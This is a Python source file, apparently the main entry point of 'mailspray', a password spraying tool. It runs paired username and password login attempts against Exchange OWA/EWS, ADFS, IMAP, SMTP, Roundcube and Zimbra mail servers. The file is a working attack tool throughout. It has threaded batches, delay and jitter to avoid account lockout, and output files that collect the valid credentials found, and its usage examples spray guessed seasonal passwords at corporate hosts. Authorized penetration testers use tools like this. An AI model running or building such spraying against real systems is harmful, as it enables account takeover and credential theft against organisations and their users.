#!/usr/bin/env python3

import sys
import os
import time
import random
import argparse
import threading
import warnings
import json
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed

warnings.filterwarnings("ignore", category=DeprecationWarning)
warnings.filterwarnings("ignore", message=".*urllib3.*")

from mailspray import __version__

try:
    from mailspray.modules import (
        ADFSModule,
        EWSModule,
        IMAPModule,
        OWAModule,
        RoundcubeModule,
        SMTPModule,
        ZimbraModule,
    )
except ImportError as e:
    print(f"\033[1;31m[!]\033[0m Missing dependency: {e}")
    print(f"\033[1;33m[*]\033[0m Run: pip install requests")
    sys.exit(1)


def _protected_tree_root():
    """Root directory we refuse to write credential files under (dev clone or installed package)."""
    pkg_dir = os.path.dirname(os.path.abspath(__file__))
    parent = os.path.dirname(pkg_dir)
    if os.path.basename(pkg_dir) == "mailspray" and os.path.isfile(
        os.path.join(parent, "main.py")
    ):
        return parent
    return pkg_dir


REPO_ROOT = _protected_tree_root()


def _downloads_dir():
    return os.path.normpath(os.path.join(os.path.expanduser("~"), "Downloads"))


def resolve_credential_output_path(path, repo_root):
    """Resolve paths for -o / -j. Never place files inside repo_root.

    Returns (absolute_path_or_None, error_message_or_None).
    - Relative **basename only** (e.g. ``found.txt``) -> ``~/Downloads/found.txt``.
    - Absolute path (after ``~`` expansion) -> used as-is if outside repo.
    - Other relative paths -> resolved against cwd; error if that lands inside repo.
    """
    if not path:
        return None, None
    raw = path.strip()
    repo_norm = os.path.normpath(os.path.abspath(repo_root))
    dl = _downloads_dir()

    def under_repo(p_abs):
        p_abs = os.path.normpath(os.path.abspath(p_abs))
        try:
            return os.path.commonpath([p_abs, repo_norm]) == repo_norm
        except ValueError:
            return False

    expanded = os.path.expanduser(raw)

    if os.path.isabs(expanded):
        final = os.path.normpath(expanded)
        if under_repo(final):
            return None, (
                f"Credential output must be outside the project tree ({repo_root}). "
                f"Use {_downloads_dir()!s} or another directory."
            )
        return final, None

    norm_raw = expanded.replace("\\", "/")
    if "/" not in norm_raw and not norm_raw.startswith(".."):
        final = os.path.normpath(os.path.join(dl, os.path.basename(expanded)))
        return final, None

    final = os.path.normpath(os.path.join(os.getcwd(), expanded))
    if under_repo(final):
        return None, (
            "Credential output cannot be inside the project directory (resolved from cwd). "
            f"Use a basename only (writes to ~/Downloads) or an absolute path outside the repo."
        )
    return final, None


def ensure_parent_dir(path):
    if not path:
        return
    parent = os.path.dirname(path)
    if parent:
        os.makedirs(parent, exist_ok=True)


# ── Colors ──────────────────────────────────────────────────────────

class C:
    R   = "\033[1;31m"    # red
    G   = "\033[1;32m"    # green
    Y   = "\033[1;33m"    # yellow
    B   = "\033[1;34m"    # blue
    C   = "\033[1;36m"    # cyan
    W   = "\033[1;37m"    # white
    D   = "\033[2m"       # dim
    X   = "\033[0m"       # reset

    @staticmethod
    def off():
        C.R = C.G = C.Y = C.B = C.C = C.W = C.D = C.X = ""


# ── Output helpers (NetExec style) ──────────────────────────────────

PROTOCOLS = {
    "owa":       {"name": "OWA",       "cls": OWAModule,       "port": 443},
    "ews":       {"name": "EWS",       "cls": EWSModule,       "port": 443},
    "adfs":      {"name": "ADFS",      "cls": ADFSModule,      "port": 443},
    "imap":      {"name": "IMAP",      "cls": IMAPModule,      "port": 993},
    "smtp":      {"name": "SMTP",      "cls": SMTPModule,      "port": 587},
    "roundcube": {"name": "RCUBE",     "cls": RoundcubeModule, "port": 443},
    "zimbra":    {"name": "ZIMBRA",    "cls": ZimbraModule,    "port": 443},
}

# Default username format per protocol when --user-format auto is used
# domain_prefix → CORP\user   (Exchange native, NTLM-style)
# upn           → user@domain (UPN, required by ADFS; typical for Zimbra/Roundcube)
# plain         → user        (no domain applied — SMTP/IMAP depend on server config)
PROTOCOL_USER_FORMAT = {
    "owa":       "domain_prefix",
    "ews":       "domain_prefix",
    "adfs":      "upn",
    "imap":      "plain",
    "smtp":      "plain",
    "roundcube": "upn",
    "zimbra":    "upn",
}

def proto_tag(name):
    return f"{C.B}{name:<7}{C.X}"

def log_success(proto, target, user, password):
    print(f"  {proto_tag(proto)} {target:<28} {C.G}[+]{C.X} {user}:{C.G}{password}{C.X}")

def log_fail(proto, target, user, password):
    print(f"  {proto_tag(proto)} {target:<28} {C.R}[-]{C.X} {user}:{C.D}{password}{C.X}")

def log_error(proto, target, user, msg):
    print(f"  {proto_tag(proto)} {target:<28} {C.Y}[!]{C.X} {user} — {C.Y}{msg}{C.X}")

def log_skip(proto, target, user, reason):
    print(f"  {proto_tag(proto)} {target:<28} {C.D}[~]{C.X} {user} — {C.D}{reason}{C.X}")

def log_info(msg):
    print(f"  {C.C}[*]{C.X} {msg}")

def log_warn(msg):
    print(f"  {C.Y}[!]{C.X} {msg}")

def log_good(msg):
    print(f"  {C.G}[+]{C.X} {msg}")


# ── Input parsing ───────────────────────────────────────────────────

def load_list(value):
    """Load from file (one per line) or treat as single value."""
    if os.path.isfile(value):
        with open(value, "r") as f:
            return [l.strip() for l in f if l.strip() and not l.startswith("#")]
    return [value]


def apply_domain(users, domain, protocol, user_format):
    """Return new list with domain formatting (same rules as spray)."""
    if not domain:
        return list(users)
    fmt = user_format if user_format != "auto" else PROTOCOL_USER_FORMAT[protocol]
    if fmt == "plain":
        log_warn(
            f"Protocol {protocol.upper()} uses plain usernames — "
            f"domain '{domain}' not applied automatically. "
            f"Use --user-format upn or domain_prefix to override."
        )
        return list(users)
    if fmt == "upn":
        return [f"{u}@{domain}" if "\\" not in u and "@" not in u else u for u in users]
    return [f"{domain}\\{u}" if "\\" not in u and "@" not in u else u for u in users]



# ── Spray engine ────────────────────────────────────────────────────

class SprayEngine:
    def __init__(self, args):
        self.args = args
        self.lock = threading.Lock()
        self.found = []
        self._found_data = []       # structured records for JSON output
        self._user_attempts = {}    # {username: attempt_count} — lockout tracking
        self._user_found = set()    # usernames with at least one valid cred
        self.total = 0
        self.done = 0
        self.skipped = 0
        self.errors = 0
        self.start_time = None
        self._interrupted = False

    def _batch_delay(self):
        """Delay between batches — not per-request."""
        if self.args.delay > 0:
            jitter = self.args.jitter * self.args.delay
            sleep_time = max(0, self.args.delay + random.uniform(-jitter, jitter))
            time.sleep(sleep_time)

    def _save(self, proto, target_display, user, password):
        host = target_display
        if "://" in host:
            host = host.split("://", 1)[1]
        host = host.rstrip("/")
        uri = f"{proto}://{user}:{password}@{host}"
        with self.lock:
            self.found.append(uri)
            self._found_data.append({
                "protocol": proto,
                "host": host,
                "username": user,
                "password": password,
                "timestamp": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
            })
            if self.args.output:
                with open(self.args.output, "a") as f:
                    f.write(uri + "\n")

    def _print_line(self, msg):
        """Print a line cleanly: clear progress bar, print, progress resumes on next tick."""
        self._clear_progress()
        print(msg)

    def _worker(self, scanner, user, password, proto_key, target):
        if self._interrupted:
            return

        proto_name = PROTOCOLS[proto_key]["name"]

        with self.lock:
            if self.args.stop_on_success and user in self._user_found:
                self.done += 1
                self.skipped += 1
                if self.args.verbose:
                    self._print_line(f"  {proto_tag(proto_name)} {target:<28} {C.D}[~]{C.X} {user} — {C.D}already found{C.X}")
                return
            if self.args.max_attempts > 0:
                if self._user_attempts.get(user, 0) >= self.args.max_attempts:
                    self.done += 1
                    self.skipped += 1
                    if self.args.verbose:
                        self._print_line(f"  {proto_tag(proto_name)} {target:<28} {C.D}[~]{C.X} {user} — {C.D}max attempts ({self.args.max_attempts}){C.X}")
                    return

        try:
            result = scanner.login(user, password)
        except Exception as e:
            with self.lock:
                self.errors += 1
                self.done += 1
                self._user_attempts[user] = self._user_attempts.get(user, 0) + 1
            if self.args.verbose:
                self._print_line(f"  {proto_tag(proto_name)} {target:<28} {C.Y}[!]{C.X} {user} — {C.Y}{str(e)[:60]}{C.X}")
            return

        with self.lock:
            self.done += 1
            self._user_attempts[user] = self._user_attempts.get(user, 0) + 1
            if result:
                self._user_found.add(user)

        if result:
            self._print_line(f"  {proto_tag(proto_name)} {target:<28} {C.G}[+]{C.X} {user}:{C.G}{password}{C.X}")
            self._save(proto_key, target, user, password)
        elif self.args.verbose:
            self._print_line(f"  {proto_tag(proto_name)} {target:<28} {C.R}[-]{C.X} {user}:{C.D}{password}{C.X}")

    # ── Progress ──

    def _progress_thread(self):
        while not self._stop_progress.is_set():
            self._print_progress()
            self._stop_progress.wait(1)
        self._clear_progress()

    def _print_progress(self):
        with self.lock:
            done = self.done
            found = len(self.found)
            errors = self.errors
            skipped = self.skipped

        elapsed = time.time() - self.start_time
        pct = (done / self.total * 100) if self.total else 0
        actual = done - skipped
        rps = f"{actual / elapsed:.1f}" if elapsed > 1 else "-"
        eta_str = ""
        if done > 0 and done < self.total:
            eta_sec = (elapsed / done) * (self.total - done)
            eta_str = f" ETA {_fmt_duration(eta_sec)}"

        line = (f"  {C.D}[{pct:5.1f}%]{C.X} "
                f"{done}/{self.total}  "
                f"{C.G}{found} found{C.X}  "
                f"{C.Y}{errors} err{C.X}  "
                f"{rps} req/s"
                f"{eta_str}")
        sys.stderr.write(f"\r{line}  \033[K")
        sys.stderr.flush()

    def _clear_progress(self):
        sys.stderr.write("\r\033[K")
        sys.stderr.flush()

    # ── Main loop: batch-based ──
    # Fires batch of -t concurrent requests, waits --delay, next batch.
    # With -t 100 --delay 30: 100 requests every 30s = 3.3 req/s.

    def run(self, scanner, pairs, proto_key, target):
        self.total = len(pairs)
        self.start_time = time.time()
        batch_size = self.args.threads

        self._stop_progress = threading.Event()
        progress = None
        if not self.args.no_progress:
            progress = threading.Thread(target=self._progress_thread, daemon=True)
            progress.start()

        pool = None
        try:
            for i in range(0, len(pairs), batch_size):
                if self._interrupted:
                    break

                batch = pairs[i:i + batch_size]
                pool = ThreadPoolExecutor(max_workers=len(batch))
                futures = [
                    pool.submit(self._worker, scanner, u, p, proto_key, target)
                    for u, p in batch
                ]
                for f in as_completed(futures):
                    pass
                pool.shutdown(wait=False)
                pool = None

                if self.args.delay > 0 and (i + batch_size) < len(pairs):
                    self._batch_delay()

        except KeyboardInterrupt:
            self._interrupted = True
            if pool:
                pool.shutdown(wait=False, cancel_futures=True)
            self._clear_progress()
            log_warn("Interrupted — finishing current batch")

        self._stop_progress.set()
        if progress:
            progress.join(timeout=1)
        self._summary()

    def _summary(self):
        elapsed = time.time() - self.start_time
        actual = self.done - self.skipped
        rps = f"{actual / elapsed:.1f}" if elapsed > 0 else "-"

        print()
        print(f"  {C.W}{'─' * 58}{C.X}")

        stats = (f"{C.G}{len(self.found)} found{C.X}  /  "
                 f"{self.done} tested  /  "
                 f"{C.Y}{self.errors} errors{C.X}")
        if self.skipped:
            stats += f"  /  {C.D}{self.skipped} skipped{C.X}"
        stats += f"  /  {_fmt_duration(elapsed)}  /  {C.C}{rps} req/s{C.X}"

        print(f"  {C.W}Results:{C.X}  {stats}")

        if self.found:
            print(f"  {C.W}Creds:{C.X}")
            for uri in self.found:
                print(f"    {C.G}{uri}{C.X}")
            if self.args.output:
                print(f"  {C.W}Saved:{C.X}   {self.args.output}")

        if self.args.json_output and self._found_data:
            with open(self.args.json_output, "w") as f:
                json.dump(self._found_data, f, indent=2)
            print(f"  {C.W}JSON:{C.X}    {self.args.json_output}")

        print(f"  {C.W}{'─' * 58}{C.X}")
        print()


# ── CLI ─────────────────────────────────────────────────────────────

BANNER = f"""\
{C.R}
    ███╗   ███╗ █████╗ ██╗██╗     ███████╗██████╗ ██████╗  █████╗ ██╗   ██╗
    ████╗ ████║██╔══██╗██║██║     ██╔════╝██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝
    ██╔████╔██║███████║██║██║     ███████╗██████╔╝██████╔╝███████║ ╚████╔╝
    ██║╚██╔╝██║██╔══██║██║██║     ╚════██║██╔═══╝ ██╔══██╗██╔══██║  ╚██╔╝
    ██║ ╚═╝ ██║██║  ██║██║███████╗███████║██║     ██║  ██║██║  ██║   ██║
    ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝{C.X}
                                          {C.C}v{__version__}{C.X} {C.D}// mail password spraying toolkit{C.X}"""


class _StoreThreads(argparse.Action):
    """Mark that -t/--threads was passed explicitly (for --fast thread bump)."""

    def __call__(self, parser, namespace, values, option_string=None):
        setattr(namespace, self.dest, values)
        namespace.threads_explicit = True


def run_probe(args, parser):
    """One login attempt for a single user (password not echoed in logs beyond attempt)."""
    print(BANNER)
    print()

    passwords = load_list(args.password)
    if not passwords:
        parser.error("Probe requires at least one password (-p / --password)")
    if len(passwords) > 1:
        log_warn(f"Probe: multiple passwords — using first only ({len(passwords)} in list)")

    password = passwords[0]
    users = apply_domain([args.probe_user], args.domain, args.protocol, args.user_format)
    user = users[0]

    proto = PROTOCOLS[args.protocol]
    scanner = proto["cls"](args.target)
    scanner.timeout = args.timeout
    if args.port:
        scanner.port = args.port
    if args.protocol == "adfs" and args.adfs_applies_to:
        scanner.applies_to = args.adfs_applies_to
    if args.debug:
        scanner.debug = True
        scanner.probe_mode = True

    log_info(f"PROBE {proto['name']} {args.target} user={user!r}")

    ok = bool(scanner.login(user, password))
    tag = f"{C.G}OK{C.X}" if ok else f"{C.R}FAIL{C.X}"
    print(f"  {C.W}Result:{C.X} {tag}")
    print()
    sys.exit(0 if ok else 1)


def _fmt_duration(seconds):
    """Format seconds into human-readable duration."""
    if seconds < 60:
        return f"{int(seconds)}s"
    elif seconds < 3600:
        m, s = divmod(int(seconds), 60)
        return f"{m}m {s}s"
    elif seconds < 86400:
        h, rem = divmod(int(seconds), 3600)
        m = rem // 60
        return f"{h}h {m}m"
    else:
        d, rem = divmod(int(seconds), 86400)
        h = rem // 3600
        return f"{d}d {h}h"


def build_parser():
    parser = argparse.ArgumentParser(
        prog="mailspray",
        description=BANNER,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        add_help=False,
    )
    parser.set_defaults(threads_explicit=False)

    target = parser.add_argument_group(f"{C.W}TARGET{C.X}")
    target.add_argument("protocol", choices=list(PROTOCOLS.keys()),
                        metavar="PROTOCOL",
                        help=f"Protocol: {', '.join(PROTOCOLS.keys())}")
    target.add_argument("target", metavar="TARGET",
                        help="Host, IP, or URL (e.g. http://mail.corp.com:8080)")
    target.add_argument("-P", "--port", type=int, metavar="PORT",
                        help="Override default port")

    auth = parser.add_argument_group(f"{C.W}CREDENTIALS{C.X}")
    creds = auth.add_mutually_exclusive_group(required=True)
    creds.add_argument("-u", "--user", metavar="USER",
                       help="Username or file with usernames (spray mode)")
    creds.add_argument("-k", "--probe", dest="probe_user", metavar="USER",
                       help="Single-user probe: one login attempt, then exit")
    auth.add_argument("-p", "--password", required=True, metavar="PASS",
                      help="Password or file with passwords")
    auth.add_argument("-d", "--domain", metavar="DOMAIN",
                      help="Domain to apply to usernames (format chosen automatically per protocol)")
    auth.add_argument("-F", "--user-format", choices=["auto", "domain_prefix", "upn", "plain"],
                      default="auto", metavar="FMT",
                      help="Username format: auto, domain_prefix (CORP\\user), upn (user@domain), plain")
    auth.add_argument("-A", "--adfs-applies-to", dest="adfs_applies_to", default=None, metavar="URI",
                      help="ADFS AppliesTo address (default: urn:federation:MicrosoftOnline)")

    engine = parser.add_argument_group(f"{C.W}ENGINE{C.X}")
    engine.add_argument("-t", "--threads", type=int, default=5, metavar="N", action=_StoreThreads,
                        help="Batch size: concurrent requests per round (default: 5)")
    engine.add_argument("-f", "--fast", action="store_true",
                        help="Fast mode: 30 threads if -t not set; intended for internal targets")
    engine.add_argument("-e", "--delay", type=float, default=0.0, metavar="SEC",
                        help="Delay between batches in seconds (not per-request)")
    engine.add_argument("-B", "--delay-scope", choices=["batch", "request"], default="batch",
                        metavar="SCOPE",
                        help="Delay applies to batch only; request scope is not implemented")
    engine.add_argument("-J", "--jitter", type=float, default=0.0, metavar="0-1",
                        help="Jitter factor for delay (0.0-1.0)")
    engine.add_argument("-T", "--timeout", type=int, default=10, metavar="SEC",
                        help="Connection timeout (default: 10)")
    engine.add_argument("-n", "--max-attempts", type=int, default=0, metavar="N",
                        help="Max login attempts per user before skipping (0 = unlimited)")
    engine.add_argument("-S", "--stop-on-success", action="store_true",
                        help="Skip remaining passwords for a user after first success")
    engine.add_argument("-D", "--debug", action="store_true",
                        help="Enable verbose protocol debug where supported")

    output = parser.add_argument_group(f"{C.W}OUTPUT{C.X}")
    output.add_argument("-o", "--output", default=None, metavar="FILE",
                        help="Append valid creds to FILE (basename only -> ~/Downloads/FILE; never inside project)")
    output.add_argument("-j", "--json", dest="json_output", metavar="FILE",
                        help="JSON of found creds (basename only -> ~/Downloads/FILE; never inside project)")
    output.add_argument("-v", "--verbose", action="store_true",
                        help="Show failed attempts, skips, and errors")
    output.add_argument("-N", "--no-color", action="store_true",
                        help="Disable ANSI colors (logs, pipes, CI)")
    output.add_argument("-q", "--no-progress", action="store_true",
                        help="Do not show the live progress line on stderr")

    misc = parser.add_argument_group(f"{C.W}MISC{C.X}")
    misc.add_argument("-h", "--help", action="help",
                      help="Show this help message")
    misc.add_argument("-V", "--version", action="version",
                      version=f"mailspray v{__version__}",
                      help="Show version")

    parser.epilog = f"""{C.W}USAGE EXAMPLES:{C.X}
  {C.D}# Probe one user (EWS example){C.X}
  mailspray ews https://mail.corp.local -k auditor1 -p 'Secret!' -d CORP -F upn -T 15 -D

  {C.D}# External OWA — 5 threads, delay 30s, 3 attempts per user{C.X}
  mailspray owa mail.corp.com -u users.txt -p 'Winter2026!' -d CORP -n 3 -S -e 30 -J 0.3

  {C.D}# OWA spray + JSON{C.X}
  mailspray owa https://owa.corp.com -u users.txt -p passes.txt -d CORP -F upn -e 0 -t 8 -S -j results.json

  {C.D}# ADFS — UPN auto-applied{C.X}
  mailspray adfs adfs.corp.com -u users.txt -p passes.txt -d corp.local -n 3 -S -e 30 -J 0.3

  {C.D}# EWS{C.X}
  mailspray ews https://mail.corp.com -u users.txt -p passes.txt -d CORP -n 3 -S -e 20 -J 0.5

  {C.D}# Internal — fast (30 threads if -t omitted){C.X}
  mailspray imap 192.168.1.10 -u users.txt -p 'Password1' -f
  mailspray owa 10.10.10.5 -u users.txt -p passes.txt -d CORP -f -n 3

  {C.D}# SMTP{C.X}
  mailspray smtp smtp.target.com -u emails.txt -p passwords.txt -e 5 -J 0.4
  mailspray smtp smtp.corp.com -u users.txt -p passes.txt -d corp.local -F upn

  {C.D}# Roundcube custom port{C.X}
  mailspray roundcube http://mail.corp.com:8080 -u users.txt -p pass.txt -d corp.com

  {C.D}# Zimbra + JSON{C.X}
  mailspray zimbra http://webmail.target.com:8443 -u users.txt -p 'Spring2026!' -d target.com -j results.json

{C.W}SUPPORTED PROTOCOLS:{C.X}
  owa          Outlook Web Access (Exchange)           [443]  auto: CORP\\user
  ews          Exchange Web Services (NTLM/Basic)      [443]  auto: CORP\\user
  adfs         AD Federation Services (WS-Trust)       [443]  auto: user@domain
  imap         IMAP with SSL/STARTTLS                  [993]  auto: plain
  smtp         SMTP with STARTTLS                      [587]  auto: plain
  roundcube    Roundcube Webmail                       [443]  auto: user@domain
  zimbra       Zimbra Webmail                          [443]  auto: user@domain
"""
    return parser


def main():
    if len(sys.argv) == 1:
        build_parser().print_help()
        sys.exit(0)

    parser = build_parser()
    args = parser.parse_args()

    if args.no_color:
        C.off()

    if args.probe_user:
        run_probe(args, parser)

    if args.delay_scope == "request":
        log_warn("--delay-scope request is not implemented; using batch delay only (-e)")

    if args.output:
        args.output, err = resolve_credential_output_path(args.output, REPO_ROOT)
        if err:
            parser.error(err)
        ensure_parent_dir(args.output)
    if args.json_output:
        args.json_output, err = resolve_credential_output_path(args.json_output, REPO_ROOT)
        if err:
            parser.error(err)
        ensure_parent_dir(args.json_output)

    # ── Build credential pairs ──
    users = load_list(args.user)
    passwords = load_list(args.password)
    if not users:
        parser.error("No usernames provided")
    if not passwords:
        parser.error("No passwords provided")

    users = apply_domain(users, args.domain, args.protocol, args.user_format)

    # password spraying order: each password against all users first
    pairs = []
    for p in passwords:
        for u in users:
            pairs.append((u, p))

    # ── Fast mode (internal/local targets) ──
    if args.fast and not args.threads_explicit:
        args.threads = 30

    # ── Init scanner ──
    proto = PROTOCOLS[args.protocol]
    scanner = proto["cls"](args.target)
    scanner.timeout = args.timeout

    if args.port:
        scanner.port = args.port

    if args.protocol == "adfs" and args.adfs_applies_to:
        scanner.applies_to = args.adfs_applies_to

    if args.debug:
        scanner.debug = True

    # ── Pre-flight ──
    print(BANNER)
    print()

    target_url = scanner.base_url()
    mode = f"{C.Y}FAST{C.X}" if args.fast else f"{C.D}normal{C.X}"

    print(f"  {proto_tag(proto['name'])} {C.W}{target_url}{C.X}")

    if args.domain:
        fmt = args.user_format if args.user_format != "auto" else PROTOCOL_USER_FORMAT[args.protocol]
        fmt_labels = {
            "domain_prefix": f"{args.domain}\\\\user",
            "upn":           f"user@{args.domain}",
            "plain":         "plain (no domain)",
        }
        log_info(f"Format: {C.W}{fmt_labels[fmt]}{C.X}")

    log_info(f"Users: {C.W}{len(users)}{C.X}  |  Passwords: {C.W}{len(passwords)}{C.X}  |  Combinations: {C.W}{len(pairs)}{C.X}")
    log_info(f"Threads: {C.W}{args.threads}{C.X}  |  Mode: {mode}")

    if args.delay > 0:
        log_info(f"Delay: {C.W}{args.delay}s{C.X} (jitter: {args.jitter})")
        # ETA: each batch = threads concurrent, then delay
        batches = (len(pairs) + args.threads - 1) // args.threads
        eta_sec = batches * args.delay
        log_info(f"ETA: {C.Y}~{_fmt_duration(eta_sec)}{C.X} {C.D}(estimated with delay, actual may vary){C.X}")
    else:
        log_info(f"Delay: {C.D}none{C.X}")

    if args.max_attempts > 0:
        log_info(f"Max attempts/user: {C.W}{args.max_attempts}{C.X}")
    if args.stop_on_success:
        log_info(f"Stop-on-success: {C.W}enabled{C.X}")
    if args.output:
        log_info(f"Hits file (-o): {C.W}{args.output}{C.X}")
    if args.json_output:
        log_info(f"JSON (-j): {C.W}{args.json_output}{C.X}")

    print()

    # ── Run ──
    engine = SprayEngine(args)
    engine.run(scanner, pairs, args.protocol, scanner.base_url())


def run_cli():
    try:
        main()
    except KeyboardInterrupt:
        print()
        log_warn("Interrupted by user")
        sys.exit(0)


if __name__ == "__main__":
    run_cli()
